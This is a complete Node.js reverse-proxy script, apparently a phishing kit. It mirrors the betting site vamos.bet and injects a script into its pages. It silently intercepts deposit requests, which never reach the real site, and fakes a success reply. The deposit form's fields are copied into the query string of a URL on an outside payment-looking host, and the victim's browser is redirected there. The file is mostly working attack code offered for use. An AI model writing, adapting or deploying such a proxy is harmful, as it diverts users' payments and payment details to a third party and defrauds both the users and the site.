import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Upstream website
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

// Redirect trigger API
const REDIRECT_API_PATH = "/api/v2/transactions/deposit";

// Redirect destination base
const REDIRECT_BASE_URL = "https://poopay-pp-yot-4249.ai.studio/";

// Session lifetime limits
const REDIRECT_TTL_MS = 60_000;
const MAX_BODY_SIZE = 1 * 1024 * 1024;
const UPSTREAM_TIMEOUT_MS = 30_000;
const CLIENT_TIMEOUT_MS = 120_000;

/*
|--------------------------------------------------------------------------
| CLIENT STATE
|--------------------------------------------------------------------------
*/

const clients = new Map();

/*
|--------------------------------------------------------------------------
| UPSTREAM HTTPS AGENT (Prevents 502 connection drops under load)
|--------------------------------------------------------------------------
*/

const upstreamAgent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 1_000,
  maxSockets: 200,
  maxFreeSockets: 50,
  timeout: 60_000
});

/*
|--------------------------------------------------------------------------
| CLIENT SESSION MANAGEMENT
|--------------------------------------------------------------------------
*/

function createClientId() {
  return crypto.randomUUID();
}

function getClientId(req) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/(?:^|;\s*)proxy_client_id=([^;]+)/);
  return match ? match[1] : null;
}

function getOrCreateClient(req) {
  let id = getClientId(req);

  if (!id) {
    id = createClientId();
  }

  let state = clients.get(id);

  if (!state) {
    state = {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now(),
      lastSeen: Date.now()
    };
    clients.set(id, state);
  } else {
    state.lastSeen = Date.now();
  }

  return id;
}

/*
|--------------------------------------------------------------------------
| SESSION CLEANUP
|--------------------------------------------------------------------------
*/

const cleanupTimer = setInterval(() => {
  const now = Date.now();
  for (const [id, state] of clients.entries()) {
    if (now - state.lastSeen > REDIRECT_TTL_MS) {
      clients.delete(id);
    }
  }
}, 15_000);

cleanupTimer.unref();

/*
|--------------------------------------------------------------------------
| HOP-BY-HOP HEADERS CLEANUP
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(headers) {
  const result = { ...headers };
  const connection = result.connection;

  if (connection) {
    const connectionHeaders = connection
      .split(",")
      .map(v => v.trim().toLowerCase());

    for (const header of connectionHeaders) {
      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;
  delete result["transfer-encoding"];

  return result;
}

/*
|--------------------------------------------------------------------------
| SET-COOKIE MANAGEMENT
|--------------------------------------------------------------------------
*/

function addProxyCookie(headers, clientId) {
  const result = { ...headers };
  const proxyCookie = `proxy_client_id=${clientId}; Path=/; HttpOnly; Secure; SameSite=Lax`;

  const existing = result["set-cookie"];

  if (!existing) {
    result["set-cookie"] = [proxyCookie];
  } else if (Array.isArray(existing)) {
    result["set-cookie"] = [...existing, proxyCookie];
  } else {
    result["set-cookie"] = [existing, proxyCookie];
  }

  return result;
}

/*
|--------------------------------------------------------------------------
| UPSTREAM HEADERS
|--------------------------------------------------------------------------
*/

function buildUpstreamHeaders(clientReq) {
  const headers = {
    ...clientReq.headers,
    host: TARGET_HOSTNAME,
    "accept-encoding": "identity"
  };

  delete headers.connection;
  delete headers["content-length"];

  return headers;
}

/*
|--------------------------------------------------------------------------
| REDIRECT WATCHER SCRIPT
|--------------------------------------------------------------------------
*/

function sendRedirectScript(clientRes) {
  const script = `
(function () {
  "use strict";

  const INTERVAL = 700;

  async function checkRedirect() {
    try {
      const response = await fetch("/__proxy_redirect_status", {
        method: "GET",
        cache: "no-store",
        credentials: "same-origin"
      });

      if (!response.ok) return;

      const data = await response.json();

      if (
        data.redirect === true &&
        typeof data.url === "string" &&
        data.url.length > 0
      ) {
        console.log("[Proxy] Redirecting browser:", data.url);
        window.location.replace(data.url);
      }
    } catch (error) {
      console.debug("[Proxy] redirect check failed");
    }
  }

  checkRedirect();
  setInterval(checkRedirect, INTERVAL);
})();
`;

  clientRes.writeHead(200, {
    "Content-Type": "application/javascript; charset=utf-8",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Content-Length": Buffer.byteLength(script)
  });

  clientRes.end(script);
}

function injectWatcher(html) {
  const tag = `<script src="/__proxy_redirect.js"></script>`;

  if (html.includes("/__proxy_redirect.js")) {
    return html;
  }

  if (html.includes("</head>")) {
    return html.replace("</head>", `${tag}</head>`);
  }

  if (html.includes("</body>")) {
    return html.replace("</body>", `${tag}</body>`);
  }

  return tag + html;
}

/*
|--------------------------------------------------------------------------
| HTML RESPONSE HANDLING
|--------------------------------------------------------------------------
*/

function handleHtmlResponse(upstreamRes, clientRes, clientId) {
  const chunks = [];
  let totalSize = 0;

  upstreamRes.on("data", chunk => {
    totalSize += chunk.length;
    if (totalSize <= 15 * 1024 * 1024) {
      chunks.push(chunk);
    }
  });

  upstreamRes.on("end", () => {
    try {
      if (totalSize > 15 * 1024 * 1024) {
        clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
        clientRes.end("HTML response too large");
        return;
      }

      let body = Buffer.concat(chunks);
      let html = body.toString("utf8");

      html = injectWatcher(html);
      body = Buffer.from(html, "utf8");

      let headers = removeHopByHopHeaders(upstreamRes.headers);
      delete headers["content-length"];
      delete headers["content-encoding"];
      delete headers["transfer-encoding"];

      headers["content-length"] = body.length;
      headers = addProxyCookie(headers, clientId);

      clientRes.writeHead(upstreamRes.statusCode || 200, headers);
      clientRes.end(body);
    } catch (error) {
      console.error("❌ HTML processing error:", error.message);
      if (!clientRes.headersSent) {
        clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
      }
      clientRes.end("Bad Gateway");
    }
  });

  upstreamRes.on("error", error => {
    console.error("❌ HTML response error:", error.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502);
    }
    clientRes.end("Bad Gateway");
  });
}

/*
|--------------------------------------------------------------------------
| NORMAL RESPONSE HANDLING
|--------------------------------------------------------------------------
*/

function handleNormalResponse(upstreamRes, clientRes, clientId) {
  let headers = removeHopByHopHeaders(upstreamRes.headers);

  if (headers["content-length"] !== undefined) {
    const length = Number(headers["content-length"]);
    if (!Number.isFinite(length) || length < 0) {
      delete headers["content-length"];
    }
  }

  headers = addProxyCookie(headers, clientId);

  if (!clientRes.headersSent) {
    clientRes.writeHead(upstreamRes.statusCode || 200, headers);
  }

  upstreamRes.on("error", error => {
    console.error("❌ Upstream response error:", error.message);
    clientRes.destroy();
  });

  upstreamRes.pipe(clientRes);
}

/*
|--------------------------------------------------------------------------
| FORWARD REQUEST TO UPSTREAM
|--------------------------------------------------------------------------
*/

function forwardRequest(clientReq, clientRes, clientId, bufferedBody = null) {
  const headers = buildUpstreamHeaders(clientReq);

  if (Buffer.isBuffer(bufferedBody)) {
    headers["content-length"] = bufferedBody.length;
  }

  const options = {
    hostname: TARGET_HOSTNAME,
    port: TARGET_PORT,
    method: clientReq.method,
    path: clientReq.url,
    headers,
    agent: upstreamAgent,
    servername: TARGET_HOSTNAME,
    rejectUnauthorized: true
  };

  console.log(`→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`);

  const upstreamReq = https.request(options, upstreamRes => {
    console.log(`← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`);

    const contentType = upstreamRes.headers["content-type"] || "";

    if (contentType.toLowerCase().includes("text/html")) {
      handleHtmlResponse(upstreamRes, clientRes, clientId);
      return;
    }

    handleNormalResponse(upstreamRes, clientRes, clientId);
  });

  upstreamReq.setTimeout(UPSTREAM_TIMEOUT_MS, () => {
    console.error(`❌ Upstream timeout after ${UPSTREAM_TIMEOUT_MS}ms`);
    upstreamReq.destroy(new Error("Upstream timeout"));
  });

  upstreamReq.on("error", error => {
    console.error("❌ Upstream error:", error.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, {
        "Content-Type": "text/plain; charset=utf-8",
        "Cache-Control": "no-store"
      });
      clientRes.end("Bad Gateway");
    } else {
      clientRes.destroy();
    }
  });

  if (Buffer.isBuffer(bufferedBody)) {
    upstreamReq.end(bufferedBody);
    return;
  }

  clientReq.pipe(upstreamReq);
}

/*
|--------------------------------------------------------------------------
| REDIRECT STATUS CONSUMPTION (One-Time Fetch)
|--------------------------------------------------------------------------
*/

function handleRedirectStatus(state, clientRes, clientId) {
  const isRedirected = Boolean(state?.redirected);
  const redirectUrl = state?.redirectUrl || null;

  // Clear state after client consumes it to prevent looping & allow manual back-navigation
  if (state && state.redirected) {
    state.redirected = false;
    state.redirectUrl = null;
  }

  const response = JSON.stringify({
    redirect: isRedirected,
    url: redirectUrl
  });

  let headers = {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Content-Length": Buffer.byteLength(response)
  };

  headers = addProxyCookie(headers, clientId);

  clientRes.writeHead(200, headers);
  clientRes.end(response);
}

/*
|--------------------------------------------------------------------------
| REDIRECT API TRIGGER (Body -> Query String)
|--------------------------------------------------------------------------
*/

async function handleRedirectRequest(clientReq, clientRes, state, clientId) {
  const chunks = [];
  let totalSize = 0;

  try {
    for await (const chunk of clientReq) {
      totalSize += chunk.length;
      if (totalSize > MAX_BODY_SIZE) {
        clientRes.writeHead(413, { "Content-Type": "text/plain; charset=utf-8" });
        clientRes.end("Request body too large");
        return;
      }
      chunks.push(chunk);
    }
  } catch (error) {
    console.error("❌ Request body error:", error.message);
    clientRes.writeHead(400);
    clientRes.end("Bad Request");
    return;
  }

  const body = Buffer.concat(chunks);

  if (body.length === 0) {
    forwardRequest(clientReq, clientRes, clientId, body);
    return;
  }

  console.log(`\n==========================================\n🚨 REDIRECT TRIGGERED`);
  console.log(`Endpoint: ${REDIRECT_API_PATH}\nBody size: ${body.length} bytes`);

  const redirectUrl = new URL(REDIRECT_BASE_URL);

  try {
    const json = JSON.parse(body.toString("utf8"));
    if (json && typeof json === "object" && !Array.isArray(json)) {
      for (const [key, value] of Object.entries(json)) {
        if (value !== undefined && value !== null) {
          redirectUrl.searchParams.set(key, String(value));
        }
      }
    }
  } catch {
    console.log("Request body is non-JSON; using base redirect URL.");
  }

  const finalUrl = redirectUrl.toString();
  console.log(`➡ Destination URL: ${finalUrl}`);

  if (state) {
    state.redirected = true;
    state.redirectUrl = finalUrl;
    state.lastSeen = Date.now();
  }

  // Intercept request and respond directly without sending upstream
  const response = JSON.stringify({ success: true, proxyRedirect: true });
  let headers = {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Content-Length": Buffer.byteLength(response)
  };

  headers = addProxyCookie(headers, clientId);

  clientRes.writeHead(200, headers);
  clientRes.end(response);

  console.log("==========================================\n");
}

/*
|--------------------------------------------------------------------------
| MAIN HTTP SERVER
|--------------------------------------------------------------------------
*/

const server = http.createServer(async (clientReq, clientRes) => {
  clientReq.setTimeout(CLIENT_TIMEOUT_MS, () => {
    console.error("❌ Client request timeout");
    clientReq.destroy();
  });

  try {
    const parsedUrl = new URL(
      clientReq.url,
      `http://${clientReq.headers.host || "localhost"}`
    );
    const path = parsedUrl.pathname;

    const clientId = getOrCreateClient(clientReq);
    const state = clients.get(clientId);

    console.log(`→ ${clientReq.method} ${clientReq.url}`);

    // Serve script watcher
    if (clientReq.method === "GET" && path === "/__proxy_redirect.js") {
      sendRedirectScript(clientRes);
      return;
    }

    // Serve redirect status check
    if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
      handleRedirectStatus(state, clientRes, clientId);
      return;
    }

    // Trigger API endpoint interceptor
    if (path === REDIRECT_API_PATH) {
      await handleRedirectRequest(clientReq, clientRes, state, clientId);
      return;
    }

    // Standard proxy pipeline (Runs continuously, even after back-navigation)
    forwardRequest(clientReq, clientRes, clientId);

  } catch (error) {
    console.error("❌ Request handler error:", error);
    if (!clientRes.headersSent) {
      clientRes.writeHead(500, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end("Internal Server Error");
  }
});

/*
|--------------------------------------------------------------------------
| SERVER TIMEOUT & ERROR HANDLERS
|--------------------------------------------------------------------------
*/

server.requestTimeout = CLIENT_TIMEOUT_MS;
server.headersTimeout = 65_000;
server.keepAliveTimeout = 65_000;
server.maxRequestsPerSocket = 0;

server.on("clientError", (error, socket) => {
  console.error("❌ Client error:", error.message);
  if (socket.writable) {
    socket.end("HTTP/1.1 400 Bad Request\r\n\r\n");
  }
});

process.on("uncaughtException", error => {
  console.error("❌ uncaughtException:", error);
});

process.on("unhandledRejection", error => {
  console.error("❌ unhandledRejection:", error);
});

/*
|--------------------------------------------------------------------------
| START SERVER
|--------------------------------------------------------------------------
*/

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log("\n==========================================");
  console.log(" MarziPlus Reverse Proxy");
  console.log("==========================================");
  console.log(`Local:    http://${PROXY_HOST}:${PROXY_PORT}`);
  console.log(`Upstream: https://${TARGET_HOSTNAME}`);
  console.log(`Trigger:  ${REDIRECT_API_PATH}`);
  console.log(`Redirect: ${REDIRECT_BASE_URL}`);
  console.log("==========================================\n");
});